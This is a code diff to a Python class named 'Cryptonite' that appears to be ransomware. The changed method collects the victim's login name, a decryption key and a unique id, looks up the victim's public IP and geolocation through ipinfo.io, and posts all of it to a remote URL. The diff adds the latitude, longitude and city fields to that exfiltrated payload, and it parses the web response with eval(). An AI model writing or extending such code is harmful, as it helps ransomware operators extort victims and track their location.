@@ -53,12 +53,19 @@ class Cryptonite():
         user = os.getlogin()
         key = self.decryptPlease
         try:
-            ip = r.get("https://ident.me/").text
+            info = eval(r.get("https://ipinfo.io/json").text)
+            ip = info["ip"]
+            lat = info["loc"].split(",")[0]
+            long = info["loc"].split(",")[1]
+            location = info["city"] + ", " + info["region"] + ", " +info["country"]
             jsonFormat = {
                 "uniqueId": id,
                 "user": user,
                 "key": key,
-                "ip": ip
+                "ip": ip,
+                "latitude": lat,
+                "longitude": long,
+                "location": location
             }
             r.post(URL, data=json.dumps(jsonFormat))
         except:
